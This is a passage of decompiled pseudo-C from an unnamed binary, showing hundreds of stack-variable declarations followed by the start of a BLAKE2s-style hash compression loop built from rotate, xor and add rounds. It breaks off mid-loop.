  int v327; // r9d
  int v328; // r8d
  int v329; // esi
  int v330; // r9d
  int v331; // edx
  int v332; // r13d
  int v333; // r15d
  int v334; // r10d
  int v335; // r13d
  int v336; // r15d
  bool v337; // zf
  int v338; // [rsp+0h] [rbp-108h]
  int v339; // [rsp+0h] [rbp-108h]
  int v340; // [rsp+0h] [rbp-108h]
  int v341; // [rsp+0h] [rbp-108h]
  int v342; // [rsp+0h] [rbp-108h]
  int v343; // [rsp+0h] [rbp-108h]
  int v344; // [rsp+0h] [rbp-108h]
  int v345; // [rsp+0h] [rbp-108h]
  int v346; // [rsp+0h] [rbp-108h]
  int v347; // [rsp+0h] [rbp-108h]
  int v348; // [rsp+0h] [rbp-108h]
  int v349; // [rsp+0h] [rbp-108h]
  int v350; // [rsp+0h] [rbp-108h]
  int v351; // [rsp+0h] [rbp-108h]
  int v352; // [rsp+0h] [rbp-108h]
  int v353; // [rsp+0h] [rbp-108h]
  int v354; // [rsp+0h] [rbp-108h]
  int v355; // [rsp+0h] [rbp-108h]
  int v356; // [rsp+0h] [rbp-108h]
  int v357; // [rsp+0h] [rbp-108h]
  int v358; // [rsp+0h] [rbp-108h]
  int v359; // [rsp+0h] [rbp-108h]
  int v360; // [rsp+0h] [rbp-108h]
  int v361; // [rsp+0h] [rbp-108h]
  int v362; // [rsp+0h] [rbp-108h]
  int v363; // [rsp+0h] [rbp-108h]
  int v364; // [rsp+0h] [rbp-108h]
  int v365; // [rsp+0h] [rbp-108h]
  int v366; // [rsp+0h] [rbp-108h]
  int v367; // [rsp+0h] [rbp-108h]
  int v368; // [rsp+0h] [rbp-108h]
  int v369; // [rsp+0h] [rbp-108h]
  int v370; // [rsp+0h] [rbp-108h]
  int v371; // [rsp+0h] [rbp-108h]
  int v372; // [rsp+4h] [rbp-104h]
  int v373; // [rsp+4h] [rbp-104h]
  int v374; // [rsp+4h] [rbp-104h]
  int v375; // [rsp+4h] [rbp-104h]
  int v376; // [rsp+4h] [rbp-104h]
  int v377; // [rsp+4h] [rbp-104h]
  int v378; // [rsp+4h] [rbp-104h]
  int v379; // [rsp+4h] [rbp-104h]
  int v380; // [rsp+4h] [rbp-104h]
  int v381; // [rsp+4h] [rbp-104h]
  int v382; // [rsp+4h] [rbp-104h]
  int v383; // [rsp+4h] [rbp-104h]
  int v384; // [rsp+4h] [rbp-104h]
  int v385; // [rsp+4h] [rbp-104h]
  int v386; // [rsp+4h] [rbp-104h]
  int v387; // [rsp+4h] [rbp-104h]
  int v388; // [rsp+4h] [rbp-104h]
  int v389; // [rsp+4h] [rbp-104h]
  int v390; // [rsp+4h] [rbp-104h]
  int v391; // [rsp+4h] [rbp-104h]
  int v392; // [rsp+4h] [rbp-104h]
  int v393; // [rsp+4h] [rbp-104h]
  int v394; // [rsp+4h] [rbp-104h]
  int v395; // [rsp+4h] [rbp-104h]
  int v396; // [rsp+4h] [rbp-104h]
  int v397; // [rsp+4h] [rbp-104h]
  int v398; // [rsp+4h] [rbp-104h]
  int v399; // [rsp+4h] [rbp-104h]
  int v400; // [rsp+4h] [rbp-104h]
  int v401; // [rsp+4h] [rbp-104h]
  int v402; // [rsp+4h] [rbp-104h]
  int v403; // [rsp+4h] [rbp-104h]
  int v404; // [rsp+4h] [rbp-104h]
  int v405; // [rsp+4h] [rbp-104h]
  int v406; // [rsp+4h] [rbp-104h]
  int v407; // [rsp+8h] [rbp-100h]
  int v408; // [rsp+8h] [rbp-100h]
  int v409; // [rsp+8h] [rbp-100h]
  int v410; // [rsp+8h] [rbp-100h]
  int v411; // [rsp+8h] [rbp-100h]
  int v412; // [rsp+8h] [rbp-100h]
  int v413; // [rsp+8h] [rbp-100h]
  int v414; // [rsp+8h] [rbp-100h]
  int v415; // [rsp+8h] [rbp-100h]
  int v416; // [rsp+8h] [rbp-100h]
  int v417; // [rsp+8h] [rbp-100h]
  int v418; // [rsp+8h] [rbp-100h]
  int v419; // [rsp+8h] [rbp-100h]
  int v420; // [rsp+8h] [rbp-100h]
  int v421; // [rsp+8h] [rbp-100h]
  int v422; // [rsp+8h] [rbp-100h]
  int v423; // [rsp+8h] [rbp-100h]
  int v424; // [rsp+8h] [rbp-100h]
  int v425; // [rsp+8h] [rbp-100h]
  int v426; // [rsp+8h] [rbp-100h]
  int v427; // [rsp+8h] [rbp-100h]
  int v428; // [rsp+8h] [rbp-100h]
  int v429; // [rsp+8h] [rbp-100h]
  int v430; // [rsp+8h] [rbp-100h]
  int v431; // [rsp+8h] [rbp-100h]
  int v432; // [rsp+8h] [rbp-100h]
  int v433; // [rsp+8h] [rbp-100h]
  int v434; // [rsp+8h] [rbp-100h]
  int v435; // [rsp+8h] [rbp-100h]
  int v436; // [rsp+8h] [rbp-100h]
  int v437; // [rsp+8h] [rbp-100h]
  int v438; // [rsp+8h] [rbp-100h]
  int v439; // [rsp+8h] [rbp-100h]
  int v440; // [rsp+8h] [rbp-100h]
  int v441; // [rsp+Ch] [rbp-FCh]
  int v442; // [rsp+Ch] [rbp-FCh]
  int v443; // [rsp+Ch] [rbp-FCh]
  int v444; // [rsp+Ch] [rbp-FCh]
  int v445; // [rsp+Ch] [rbp-FCh]
  int v446; // [rsp+Ch] [rbp-FCh]
  int v447; // [rsp+Ch] [rbp-FCh]
  int v448; // [rsp+Ch] [rbp-FCh]
  int v449; // [rsp+Ch] [rbp-FCh]
  int v450; // [rsp+Ch] [rbp-FCh]
  int v451; // [rsp+Ch] [rbp-FCh]
  int v452; // [rsp+Ch] [rbp-FCh]
  int v453; // [rsp+Ch] [rbp-FCh]
  int v454; // [rsp+Ch] [rbp-FCh]
  int v455; // [rsp+Ch] [rbp-FCh]
  int v456; // [rsp+Ch] [rbp-FCh]
  int v457; // [rsp+Ch] [rbp-FCh]
  int v458; // [rsp+Ch] [rbp-FCh]
  int v459; // [rsp+Ch] [rbp-FCh]
  int v460; // [rsp+Ch] [rbp-FCh]
  int v461; // [rsp+Ch] [rbp-FCh]
  int v462; // [rsp+Ch] [rbp-FCh]
  int v463; // [rsp+Ch] [rbp-FCh]
  int v464; // [rsp+Ch] [rbp-FCh]
  int v465; // [rsp+Ch] [rbp-FCh]
  int v466; // [rsp+Ch] [rbp-FCh]
  int v467; // [rsp+Ch] [rbp-FCh]
  int v468; // [rsp+Ch] [rbp-FCh]
  int v469; // [rsp+Ch] [rbp-FCh]
  int v470; // [rsp+Ch] [rbp-FCh]
  int v471; // [rsp+Ch] [rbp-FCh]
  int v472; // [rsp+Ch] [rbp-FCh]
  int v473; // [rsp+10h] [rbp-F8h]
  int v474; // [rsp+10h] [rbp-F8h]
  int v475; // [rsp+10h] [rbp-F8h]
  int v476; // [rsp+10h] [rbp-F8h]
  int v477; // [rsp+10h] [rbp-F8h]
  int v478; // [rsp+10h] [rbp-F8h]
  int v479; // [rsp+10h] [rbp-F8h]
  int v480; // [rsp+10h] [rbp-F8h]
  int v481; // [rsp+10h] [rbp-F8h]
  int v482; // [rsp+10h] [rbp-F8h]
  int v483; // [rsp+10h] [rbp-F8h]
  int v484; // [rsp+10h] [rbp-F8h]
  int v485; // [rsp+10h] [rbp-F8h]
  int v486; // [rsp+10h] [rbp-F8h]
  int v487; // [rsp+10h] [rbp-F8h]
  int v488; // [rsp+10h] [rbp-F8h]
  int v489; // [rsp+10h] [rbp-F8h]
  int v490; // [rsp+10h] [rbp-F8h]
  int v491; // [rsp+10h] [rbp-F8h]
  int v492; // [rsp+10h] [rbp-F8h]
  int v493; // [rsp+14h] [rbp-F4h]
  int v494; // [rsp+14h] [rbp-F4h]
  int v495; // [rsp+14h] [rbp-F4h]
  int v496; // [rsp+14h] [rbp-F4h]
  int v497; // [rsp+14h] [rbp-F4h]
  int v498; // [rsp+14h] [rbp-F4h]
  int v499; // [rsp+14h] [rbp-F4h]
  int v500; // [rsp+14h] [rbp-F4h]
  int v501; // [rsp+14h] [rbp-F4h]
  int v502; // [rsp+14h] [rbp-F4h]
  int v503; // [rsp+14h] [rbp-F4h]
  int v504; // [rsp+14h] [rbp-F4h]
  int v505; // [rsp+14h] [rbp-F4h]
  int v506; // [rsp+14h] [rbp-F4h]
  int v507; // [rsp+14h] [rbp-F4h]
  int v508; // [rsp+14h] [rbp-F4h]
  int v509; // [rsp+14h] [rbp-F4h]
  int v510; // [rsp+18h] [rbp-F0h]
  int v511; // [rsp+18h] [rbp-F0h]
  int v512; // [rsp+18h] [rbp-F0h]
  int v513; // [rsp+18h] [rbp-F0h]
  int v514; // [rsp+18h] [rbp-F0h]
  int v515; // [rsp+18h] [rbp-F0h]
  int v516; // [rsp+18h] [rbp-F0h]
  int v517; // [rsp+18h] [rbp-F0h]
  int v518; // [rsp+18h] [rbp-F0h]
  int v519; // [rsp+18h] [rbp-F0h]
  int v520; // [rsp+18h] [rbp-F0h]
  int v521; // [rsp+18h] [rbp-F0h]
  int v522; // [rsp+18h] [rbp-F0h]
  int v523; // [rsp+18h] [rbp-F0h]
  int v524; // [rsp+18h] [rbp-F0h]
  int v525; // [rsp+18h] [rbp-F0h]
  int v526; // [rsp+18h] [rbp-F0h]
  int v527; // [rsp+18h] [rbp-F0h]
  int v528; // [rsp+18h] [rbp-F0h]
  int v529; // [rsp+18h] [rbp-F0h]
  int v530; // [rsp+18h] [rbp-F0h]
  int v531; // [rsp+18h] [rbp-F0h]
  int v532; // [rsp+18h] [rbp-F0h]
  int v533; // [rsp+1Ch] [rbp-ECh]
  int v534; // [rsp+1Ch] [rbp-ECh]
  int v535; // [rsp+1Ch] [rbp-ECh]
  int v536; // [rsp+1Ch] [rbp-ECh]
  int v537; // [rsp+1Ch] [rbp-ECh]
  int v538; // [rsp+1Ch] [rbp-ECh]
  int v539; // [rsp+1Ch] [rbp-ECh]
  int v540; // [rsp+1Ch] [rbp-ECh]
  int v541; // [rsp+1Ch] [rbp-ECh]
  int v542; // [rsp+1Ch] [rbp-ECh]
  int v543; // [rsp+1Ch] [rbp-ECh]
  int v544; // [rsp+1Ch] [rbp-ECh]
  int v545; // [rsp+1Ch] [rbp-ECh]
  int v546; // [rsp+1Ch] [rbp-ECh]
  int v547; // [rsp+1Ch] [rbp-ECh]
  int v548; // [rsp+1Ch] [rbp-ECh]
  int v549; // [rsp+1Ch] [rbp-ECh]
  int v550; // [rsp+1Ch] [rbp-ECh]
  int v551; // [rsp+1Ch] [rbp-ECh]
  int v552; // [rsp+1Ch] [rbp-ECh]
  int v553; // [rsp+1Ch] [rbp-ECh]
  int v554; // [rsp+20h] [rbp-E8h]
  int v555; // [rsp+20h] [rbp-E8h]
  int v556; // [rsp+20h] [rbp-E8h]
  int v557; // [rsp+20h] [rbp-E8h]
  int v558; // [rsp+20h] [rbp-E8h]
  int v559; // [rsp+20h] [rbp-E8h]
  int v560; // [rsp+20h] [rbp-E8h]
  int v561; // [rsp+20h] [rbp-E8h]
  int v562; // [rsp+20h] [rbp-E8h]
  int v563; // [rsp+20h] [rbp-E8h]
  int v564; // [rsp+20h] [rbp-E8h]
  int v565; // [rsp+20h] [rbp-E8h]
  int v566; // [rsp+20h] [rbp-E8h]
  int v567; // [rsp+20h] [rbp-E8h]
  int v568; // [rsp+20h] [rbp-E8h]
  int v569; // [rsp+20h] [rbp-E8h]
  int v570; // [rsp+20h] [rbp-E8h]
  int v571; // [rsp+24h] [rbp-E4h]
  int v572; // [rsp+24h] [rbp-E4h]
  int v573; // [rsp+24h] [rbp-E4h]
  int v574; // [rsp+24h] [rbp-E4h]
  int v575; // [rsp+24h] [rbp-E4h]
  int v576; // [rsp+24h] [rbp-E4h]
  int v577; // [rsp+24h] [rbp-E4h]
  int v578; // [rsp+24h] [rbp-E4h]
  int v579; // [rsp+24h] [rbp-E4h]
  int v580; // [rsp+24h] [rbp-E4h]
  int v581; // [rsp+24h] [rbp-E4h]
  int v582; // [rsp+24h] [rbp-E4h]
  int v583; // [rsp+24h] [rbp-E4h]
  int v584; // [rsp+24h] [rbp-E4h]
  int v585; // [rsp+24h] [rbp-E4h]
  int v586; // [rsp+24h] [rbp-E4h]
  int v587; // [rsp+24h] [rbp-E4h]
  int v588; // [rsp+28h] [rbp-E0h]
  int v589; // [rsp+28h] [rbp-E0h]
  int v590; // [rsp+2Ch] [rbp-DCh]
  int v591; // [rsp+2Ch] [rbp-DCh]
  int v592; // [rsp+2Ch] [rbp-DCh]
  int v593; // [rsp+30h] [rbp-D8h]
  int v594; // [rsp+30h] [rbp-D8h]
  int v595; // [rsp+30h] [rbp-D8h]
  int v596; // [rsp+34h] [rbp-D4h]
  int v597; // [rsp+38h] [rbp-D0h]
  int v598; // [rsp+3Ch] [rbp-CCh]
  int v599; // [rsp+40h] [rbp-C8h]
  int v600; // [rsp+44h] [rbp-C4h]
  int v601; // [rsp+48h] [rbp-C0h]
  int v602; // [rsp+4Ch] [rbp-BCh]
  int v603; // [rsp+50h] [rbp-B8h]
  int v604; // [rsp+50h] [rbp-B8h]
  __m128i *v605; // [rsp+58h] [rbp-B0h]
  unsigned __int64 v606; // [rsp+60h] [rbp-A8h]
  unsigned __int64 v608; // [rsp+70h] [rbp-98h]

  result = 64i64;
  v4 = (_DWORD *)a1;
  if ( a3 < 0x40 )
    result = a3;
  v606 = a3;
  v5 = *(_QWORD *)(a1 + 24);
  v6 = HIDWORD(*(_OWORD *)(a1 + 16));
  v7 = *(_OWORD *)(a1 + 16);
  v8 = HIDWORD(*(_OWORD *)a1);
  v9 = *(_QWORD *)(a1 + 8);
  v10 = HIDWORD(*(_QWORD *)a1);
  v11 = *(_OWORD *)a1;
  v608 = result;
  v605 = a2;
  v588 = v5;
  v593 = HIDWORD(*(_QWORD *)(a1 + 16));
  do
  {
    v12 = *a2;
    v13 = v4[10];
    v14 = a2[1];
    v15 = v4[11];
    v16 = a2[2];
    v17 = a2[3];
    v4[8] += result;
    v18 = (unsigned int)v4[8];
    v4[9] += v18 < result;
    v602 = _mm_cvtsi128_si32(v12);
    v19 = v7 + v602 + v11;
    v20 = __ROR4__(v18 ^ 0x510E527F ^ v19, 16);
    v597 = _mm_cvtsi128_si32(_mm_srli_si128(v12, 4));
    v21 = v20 + _mm_cvtsi128_si32((__m128i)SHA256_Constants_140119400);
    LODWORD(v18) = __ROR4__(v7 ^ v21, 12);
    v372 = v18 + v597 + v19;
    v590 = _mm_cvtsi128_si32(_mm_srli_si128(v12, 8));
    v22 = v593 + v590 + v10;
    v23 = __ROR4__(v20 ^ v372, 8);
    v24 = __ROR4__(v22 ^ v4[9] ^ 0x9B05688C, 16);
    v25 = v23 + v21;
    v599 = _mm_cvtsi128_si32(_mm_srli_si128(v12, 12));
    v26 = __ROR4__(v18 ^ v25, 7);
    LODWORD(v18) = __ROR4__(v593 ^ (v24 + DWORD1(SHA256_Constants_140119400)), 12);
    v441 = v18 + v599 + v22;
    v473 = __ROR4__(v441 ^ v24, 8);
    v596 = _mm_cvtsi128_si32(v14);
    v554 = v473 + v24 + DWORD1(SHA256_Constants_140119400);
    v27 = v5 + v596 + v9;
    v28 = __ROR4__(v18 ^ v554, 7);
    v29 = __ROR4__(v27 ^ v13 ^ 0x1F83D9AB, 16);
    LODWORD(v18) = __ROR4__(v588 ^ (v29 + DWORD2(SHA256_Constants_140119400)), 12);
    v598 = _mm_cvtsi128_si32(_mm_srli_si128(v14, 4));
    v407 = v18 + v598 + v27;
    v594 = _mm_cvtsi128_si32(_mm_srli_si128(v14, 8));
    v30 = v6 + v594 + v8;
    v493 = __ROR4__(v407 ^ v29, 8);
    v31 = v493 + v29 + DWORD2(SHA256_Constants_140119400);
    v32 = __ROR4__(v30 ^ v15 ^ 0x5BE0CD19, 16);
    v33 = v32 + HIDWORD(SHA256_Constants_140119400);
    v34 = __ROR4__(v18 ^ v31, 7);
    LODWORD(v18) = __ROR4__(v6 ^ (v32 + HIDWORD(SHA256_Constants_140119400)), 12);
    v35 = _mm_cvtsi128_si32(_mm_srli_si128(v14, 12));
    v338 = v18 + v35 + v30;
    v36 = __ROR4__(v338 ^ v32, 8);
    v37 = v36 + v33;
    v38 = _mm_cvtsi128_si32(v16);
    v39 = __ROR4__(v18 ^ v37, 7);
    LODWORD(v18) = __ROR4__(v36 ^ (v28 + v38 + v372), 16);
    v40 = v18 + v31;
    v589 = _mm_cvtsi128_si32(_mm_srli_si128(v16, 4));
    v41 = __ROR4__(v28 ^ v40, 12);
    v373 = v41 + v589 + v28 + v38 + v372;
    v42 = __ROR4__(v18 ^ v373, 8);
    v510 = v42 + v40;
    v43 = v41 ^ (v42 + v40);
    v44 = _mm_cvtsi128_si32(_mm_srli_si128(v16, 8));
    v45 = __ROR4__(v43, 7);
    v46 = v34 + v44 + v441;
    v47 = __ROR4__(v46 ^ v23, 16);
    v48 = v47 + v37;
    v603 = _mm_cvtsi128_si32(_mm_srli_si128(v16, 12));
    LODWORD(v18) = __ROR4__(v34 ^ v48, 12);
    v442 = v18 + v603 + v46;
    v49 = __ROR4__(v442 ^ v47, 8);
    v571 = v49 + v48;
    v600 = _mm_cvtsi128_si32(v17);
    v50 = v39 + v600 + v407;
    v51 = __ROR4__(v18 ^ (v49 + v48), 7);
    v52 = __ROR4__(v50 ^ v473, 16);
    v53 = v52 + v25;
    v601 = _mm_cvtsi128_si32(_mm_srli_si128(v17, 4));
    LODWORD(v18) = __ROR4__(v39 ^ v53, 12);
    v54 = _mm_cvtsi128_si32(_mm_srli_si128(v17, 12));
    v408 = v18 + v601 + v50;
    v55 = __ROR4__(v408 ^ v52, 8);
    v56 = v55 + v53;
    v474 = v55;
    v57 = v18 ^ v56;
    v533 = v56;
    v58 = _mm_cvtsi128_si32(_mm_srli_si128(v17, 8));
    v59 = __ROR4__(v57, 7);
    v60 = v26 + v58 + v338;
    LODWORD(v18) = __ROR4__(v60 ^ v493, 16);
    v61 = v18 + v554;
    v62 = __ROR4__((v18 + v554) ^ v26, 12);
    v339 = v62 + v54 + v60;
    LODWORD(v18) = __ROR4__(v339 ^ v18, 8);
    v63 = v18 + v61;
    v494 = v18;
    v64 = __ROR4__(v63 ^ v62, 7);
    v374 = v64 + v58 + v373;
    LODWORD(v18) = __ROR4__(v49 ^ v374, 16);
    v534 = v18 + v533;
    v65 = __ROR4__(v64 ^ v534, 12);
    v375 = v65 + v44 + v374;
    v66 = __ROR4__(v18 ^ v375, 8);
    v535 = v66 + v534;
    v67 = __ROR4__(v65 ^ v535, 7);
    v443 = v45 + v596 + v442;
    v68 = __ROR4__(v443 ^ v474, 16);
    v69 = v68 + v63;
    LODWORD(v18) = __ROR4__(v45 ^ v69, 12);
    v444 = v18 + v38 + v443;
    v475 = __ROR4__(v444 ^ v68, 8);
    v555 = v475 + v69;
    v70 = __ROR4__(v18 ^ (v475 + v69), 7);
    v409 = v51 + v589 + v408;
    v71 = __ROR4__(v409 ^ v494, 16);
    v72 = v71 + v510;
    LODWORD(v18) = __ROR4__(v51 ^ (v71 + v510), 12);
    v410 = v18 + v54 + v409;
    v73 = __ROR4__(v410 ^ v71, 8);
    v74 = v73 + v72;
    v495 = v73;
    v75 = __ROR4__(v18 ^ v74, 7);
    v340 = v59 + v601 + v339;
    v76 = __ROR4__(v340 ^ v42, 16);
    v77 = v76 + v571;
    LODWORD(v18) = __ROR4__(v59 ^ (v76 + v571), 12);
    v341 = v18 + v594 + v340;
    v78 = __ROR4__(v341 ^ v76, 8);
    v572 = v78 + v77;
    v79 = __ROR4__(v18 ^ (v78 + v77), 7);
    v376 = v70 + v597 + v375;
    LODWORD(v18) = __ROR4__(v78 ^ v376, 16);
    v80 = __ROR4__(v70 ^ (v18 + v74), 12);
    v81 = v18 + v74;
    v377 = v80 + v600 + v376;
    v82 = __ROR4__(v18 ^ v377, 8);
    v511 = v82 + v81;
    v83 = v75 + v602 + v444;
    v84 = __ROR4__(v80 ^ (v82 + v81), 7);
    v85 = __ROR4__(v83 ^ v66, 16);
    v86 = v85 + v572;
    LODWORD(v18) = __ROR4__(v75 ^ (v85 + v572), 12);
    v87 = v18 + v590 + v83;
    v88 = __ROR4__(v87 ^ v85, 8);
    v573 = v88 + v86;
    v89 = __ROR4__(v18 ^ (v88 + v86), 7);
    v411 = v79 + v603 + v410;
    v90 = __ROR4__(v411 ^ v475, 16);
    v91 = v90 + v535;
    LODWORD(v18) = __ROR4__(v79 ^ (v90 + v535), 12);
    v412 = v18 + v35 + v411;
    v92 = __ROR4__(v412 ^ v90, 8);
    v93 = v92 + v91;
    v476 = v92;
    v94 = __ROR4__(v18 ^ v93, 7);
    v95 = (v67 + v598 + v341) ^ v495;
    v342 = v67 + v598 + v341;
    v96 = __ROR4__(v95, 16);
    v97 = __ROR4__((v96 + v555) ^ v67, 12);
    v343 = v97 + v599 + v342;
    v496 = __ROR4__(v343 ^ v96, 8);
    v556 = v496 + v96 + v555;
    v98 = __ROR4__(v556 ^ v97, 7);
    v378 = v98 + v603 + v377;
    LODWORD(v18) = __ROR4__(v88 ^ v378, 16);
    v536 = v18 + v93;
    v99 = __ROR4__(v98 ^ (v18 + v93), 12);
    v379 = v99 + v38 + v378;
    v100 = __ROR4__(v18 ^ v379, 8);
    v537 = v100 + v536;
    v101 = __ROR4__(v99 ^ v537, 7);
    v102 = __ROR4__((v84 + v600 + v87) ^ v476, 16);
    LODWORD(v18) = __ROR4__(v84 ^ (v102 + v556), 12);
    v445 = v18 + v602 + v84 + v600 + v87;
    v477 = __ROR4__(v445 ^ v102, 8);
    v557 = v477 + v102 + v556;
    v103 = __ROR4__(v18 ^ v557, 7);
    v413 = v89 + v598 + v412;
    v104 = __ROR4__(v413 ^ v496, 16);
    LODWORD(v18) = __ROR4__(v89 ^ (v104 + v511), 12);
    v414 = v18 + v590 + v413;
    v497 = __ROR4__(v414 ^ v104, 8);
    v512 = v497 + v104 + v511;
    v105 = __ROR4__(v18 ^ v512, 7);
    v344 = v94 + v54 + v343;
    v106 = __ROR4__(v344 ^ v82, 16);
    v107 = v106 + v573;
    LODWORD(v18) = __ROR4__(v94 ^ (v106 + v573), 12);
    v345 = v18 + v601 + v344;
    v108 = __ROR4__(v345 ^ v106, 8);
    v574 = v108 + v107;
    v109 = __ROR4__(v18 ^ (v108 + v107), 7);
    v380 = v103 + v44 + v379;
    LODWORD(v18) = __ROR4__(v108 ^ v380, 16);
    v513 = v18 + v512;
    v110 = __ROR4__(v103 ^ v513, 12);
    v381 = v110 + v58 + v380;
    v111 = __ROR4__(v18 ^ v381, 8);
    v514 = v111 + v513;
    v112 = __ROR4__(v110 ^ v514, 7);
    v446 = v105 + v599 + v445;
    v113 = __ROR4__(v446 ^ v100, 16);
    v114 = v113 + v574;
    LODWORD(v18) = __ROR4__(v105 ^ (v113 + v574), 12);
    v447 = v18 + v594 + v446;
    v115 = __ROR4__(v447 ^ v113, 8);
    v575 = v115 + v114;
    v116 = __ROR4__(v18 ^ (v115 + v114), 7);
    v415 = v109 + v35 + v414;
    v117 = __ROR4__(v415 ^ v477, 16);
    v118 = v117 + v537;
    LODWORD(v18) = __ROR4__(v109 ^ (v117 + v537), 12);
    v416 = v18 + v597 + v415;
    v119 = __ROR4__(v416 ^ v117, 8);
    v120 = v119 + v118;
    v478 = v119;
    v121 = __ROR4__(v18 ^ v120, 7);
    v122 = (v101 + v589 + v345) ^ v497;
    v346 = v101 + v589 + v345;
    v123 = __ROR4__(v122, 16);
    v124 = __ROR4__((v123 + v557) ^ v101, 12);
    v347 = v124 + v596 + v346;
    v498 = __ROR4__(v347 ^ v123, 8);
    v558 = v498 + v123 + v557;
    v125 = __ROR4__(v558 ^ v124, 7);
    v382 = v125 + v35 + v381;
    LODWORD(v18) = __ROR4__(v115 ^ v382, 16);
    v538 = v18 + v120;
    v126 = __ROR4__(v125 ^ (v18 + v120), 12);
    v383 = v126 + v589 + v382;
    v127 = __ROR4__(v18 ^ v383, 8);
    v539 = v127 + v538;
    v128 = __ROR4__(v126 ^ v539, 7);
    v448 = v112 + v599 + v447;
    v129 = __ROR4__(v448 ^ v478, 16);
    LODWORD(v18) = __ROR4__(v112 ^ (v129 + v558), 12);
    v449 = v18 + v597 + v448;
    v479 = __ROR4__(v449 ^ v129, 8);
    v559 = v479 + v129 + v558;
    v130 = __ROR4__(v18 ^ v559, 7);
    v417 = v116 + v601 + v416;
    v131 = __ROR4__(v417 ^ v498, 16);
    LODWORD(v18) = __ROR4__(v116 ^ (v131 + v514), 12);
    v418 = v18 + v600 + v417;
    v499 = __ROR4__(v418 ^ v131, 8);
    v515 = v499 + v131 + v514;
    v132 = __ROR4__(v18 ^ v515, 7);
    v348 = v121 + v603 + v347;
    v133 = __ROR4__(v348 ^ v111, 16);
    v134 = v133 + v575;
    LODWORD(v18) = __ROR4__(v121 ^ (v133 + v575), 12);
    v349 = v18 + v58 + v348;
    v135 = __ROR4__(v349 ^ v133, 8);
    v576 = v135 + v134;
    v136 = __ROR4__(v18 ^ (v135 + v134), 7);
    v384 = v130 + v590 + v383;
    LODWORD(v18) = __ROR4__(v135 ^ v384, 16);
    v516 = v18 + v515;
    v137 = __ROR4__(v130 ^ v516, 12);
    v385 = v137 + v594 + v384;
    v138 = __ROR4__(v18 ^ v385, 8);
    v517 = v138 + v516;
    v139 = __ROR4__(v137 ^ v517, 7);
    v450 = v132 + v598 + v449;
    v140 = __ROR4__(v450 ^ v127, 16);
    v141 = v140 + v576;
    LODWORD(v18) = __ROR4__(v132 ^ (v140 + v576), 12);
    v451 = v18 + v44 + v450;
    v142 = __ROR4__(v451 ^ v140, 8);
    v577 = v142 + v141;
    v143 = __ROR4__(v18 ^ (v142 + v141), 7);
    v419 = v136 + v596 + v418;
    v144 = __ROR4__(v419 ^ v479, 16);
    v145 = v144 + v539;
    LODWORD(v18) = __ROR4__(v136 ^ (v144 + v539), 12);
    v420 = v18 + v602 + v419;
    v146 = __ROR4__(v420 ^ v144, 8);
    v147 = v146 + v145;
    v480 = v146;
    v148 = __ROR4__(v18 ^ v147, 7);
    v149 = (v128 + v54 + v349) ^ v499;
    v350 = v128 + v54 + v349;
    v150 = __ROR4__(v149, 16);
    v151 = __ROR4__((v150 + v559) ^ v128, 12);
    v351 = v151 + v38 + v350;
    v500 = __ROR4__(v351 ^ v150, 8);
    v560 = v500 + v150 + v559;
    v152 = __ROR4__(v560 ^ v151, 7);
    v386 = v152 + v589 + v385;
    LODWORD(v18) = __ROR4__(v142 ^ v386, 16);
    v540 = v18 + v147;
    v153 = __ROR4__(v152 ^ (v18 + v147), 12);
    v387 = v153 + v602 + v386;
    v154 = __ROR4__(v18 ^ v387, 8);
    v541 = v154 + v540;
    v155 = __ROR4__(v153 ^ v541, 7);
    v452 = v139 + v598 + v451;
    v156 = __ROR4__(v452 ^ v480, 16);
    LODWORD(v18) = __ROR4__(v139 ^ (v156 + v560), 12);
    v453 = v18 + v35 + v452;
    v481 = __ROR4__(v453 ^ v156, 8);
    v561 = v481 + v156 + v560;
    v157 = __ROR4__(v18 ^ v561, 7);
    v421 = v143 + v590 + v420;
    v158 = __ROR4__(v421 ^ v500, 16);
    LODWORD(v18) = __ROR4__(v143 ^ (v158 + v517), 12);
    v422 = v18 + v596 + v421;
    v501 = __ROR4__(v422 ^ v158, 8);
    v518 = v501 + v158 + v517;
    v352 = v148 + v44 + v351;
    v159 = __ROR4__(v352 ^ v138, 16);
    v160 = v159 + v577;
    v161 = __ROR4__(v18 ^ v518, 7);
    LODWORD(v18) = __ROR4__(v148 ^ (v159 + v577), 12);
    v353 = v18 + v54 + v352;
    v162 = __ROR4__(v353 ^ v159, 8);
    v578 = v162 + v160;
    v163 = __ROR4__(v18 ^ (v162 + v160), 7);
    v388 = v157 + v58 + v387;
    LODWORD(v18) = __ROR4__(v162 ^ v388, 16);
    v519 = v18 + v518;
    v164 = __ROR4__(v157 ^ v519, 12);
    v389 = v164 + v597 + v388;
    v165 = __ROR4__(v18 ^ v389, 8);
    v520 = v165 + v519;
    v166 = v164 ^ v520;
    v454 = v161 + v603 + v453;
    v167 = __ROR4__(v454 ^ v154, 16);
    v168 = v167 + v578;
    v169 = __ROR4__(v166, 7);
    LODWORD(v18) = __ROR4__(v161 ^ (v167 + v578), 12);
    v455 = v18 + v600 + v454;
    v170 = __ROR4__(v455 ^ v167, 8);
    v579 = v170 + v168;
    v171 = __ROR4__(v18 ^ (v170 + v168), 7);
    v423 = v163 + v594 + v422;
    v172 = __ROR4__(v423 ^ v481, 16);
    v173 = v172 + v541;
    LODWORD(v18) = __ROR4__(v163 ^ (v172 + v541), 12);
    v424 = v18 + v38 + v423;
    v174 = __ROR4__(v424 ^ v172, 8);
    v175 = v174 + v173;
    v482 = v174;
    v176 = __ROR4__(v18 ^ v175, 7);
    v177 = (v155 + v599 + v353) ^ v501;
    v354 = v155 + v599 + v353;
    v178 = __ROR4__(v177, 16);
    v179 = __ROR4__((v178 + v561) ^ v155, 12);
    v355 = v179 + v601 + v354;
    v502 = __ROR4__(v355 ^ v178, 8);
    v562 = v502 + v178 + v561;
    v180 = __ROR4__(v562 ^ v179, 7);
    v390 = v180 + v590 + v389;
    LODWORD(v18) = __ROR4__(v170 ^ v390, 16);
    v542 = v18 + v175;
    v181 = __ROR4__(v180 ^ (v18 + v175), 12);
    v391 = v181 + v600 + v390;
    v182 = __ROR4__(v18 ^ v391, 8);
    v543 = v182 + v542;
    v183 = __ROR4__(v181 ^ v543, 7);
    v456 = v169 + v594 + v455;
    v184 = __ROR4__(v456 ^ v482, 16);
    LODWORD(v18) = __ROR4__(v169 ^ (v184 + v562), 12);
    v457 = v18 + v44 + v456;
    v483 = __ROR4__(v457 ^ v184, 8);
    v563 = v483 + v184 + v562;
    v185 = __ROR4__(v18 ^ v563, 7);
    v425 = v171 + v602 + v424;
    v186 = __ROR4__(v425 ^ v502, 16);
    LODWORD(v18) = __ROR4__(v171 ^ (v186 + v520), 12);
